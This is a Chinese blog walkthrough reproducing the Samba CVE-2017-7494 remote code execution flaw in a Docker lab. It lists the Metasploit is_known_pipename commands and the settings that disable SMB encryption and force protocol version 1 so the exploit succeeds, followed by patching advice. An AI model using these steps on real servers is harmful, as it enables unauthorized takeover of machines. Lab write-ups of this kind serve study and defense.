# linux Samba 远程代码执行漏洞(CVE-2017-7494)复现 - kalibb - 博客园

> 原文：[`www.cnblogs.com/lzkalislw/p/15986850.html`](https://www.cnblogs.com/lzkalislw/p/15986850.html)

**一、漏洞介绍**

　　Samba 实现 Windows 主机与 Linux 服务器之间的资源共享，Linux 操作系统提供了 Samba 服务，Samba 服务为两种不同的操作系统架起了一座桥梁，使 Linux 系统和 Windows 系统之间能够实现互相通信。samba 在 linux 系统上实现 SMB 协议的服务，使用 SMB 协议在局域网上共享文件和打印机.CVE-2017-7494，2017 年 5 月 24 日 Samba 发布了 4.6.4 版本，修复严重的远程代码执行漏洞，该漏洞影响了 Samba 3.5.0 之后到 4.6.4/4.5.10/4.4.14 中间的所有版本，可以让恶意访问者远程控制受影响的 Linux 和 Unix 机器。

**二、主要影响版本**

1、MS17-010 方程式“永恒之蓝”

WannaCry 勒索蠕虫，影响 Windows xp 到 Windows server 2012

2、CVE-2017-7494　Linux 版本“永恒之蓝”远程代码执行漏洞

Samba 3.5.0-4.6.4/4.5.1/4.4.14 中间的所有版本

**三、漏洞利用条件**

1、部署了存在漏洞的 samba 版本，并且对外网开放 445 端口；

2、匿名访问用户对共享文件有可写权限;(权限控制很重要)

3、需要知道共享目录的物理路径。

**四、漏洞危害及常见攻击方式**

1、获取服务器或个人 pc 的权限；

2、攻击者常使用渗透测试工具 metersploit 中的 exp 进行攻击。

**五、漏洞复现**

1、复现环境：

安装了 docker 的 Ubuntu 服务器：192.168.4.128

攻击机(kali):192.168.4.157

2.步骤：

开启 docker 环境

sudo  docker-compose up -d

![](img/a381bb9a58e4be2edb25cebce5b506f1.png)

 sudo docker ps     //查看漏洞环境开启情况

![](img/7824b0fb141faee07138b1ff246d0781.png)

 msfconsole

use use exploit/linux/samba/is_known_pipename

show options

![](img/b3f094994e71d288f3d3ec9400f2ce2a.png)

 set rhost 192.168.4.128

set SMB_FOLDER   /home/share

show options

![](img/8e419a2ec25271181a254795ce8c512c.png)

这里出现了加密错误，需要通过不加密来进行 exploit

![](img/bdc994ba0b0c8d0735e4dab9ab3f2702.png)

 set SMB::AlwaysEncrypt false     //设置 SMB 总是不加密
set SMB::ProtocolVersion 1         //设置协议版本为 Version 1

![](img/0f6e2fbbf5fc93fb40f082f164cf318b.png)

 exploit![](img/898e46a0d542f0f0a69f16ab9fa1bf3c.png)

**六、漏洞修复建议**

1、安装 ms17-010 不定或升级 samba 版本到 4.6.4

2、对外网关闭 445 端口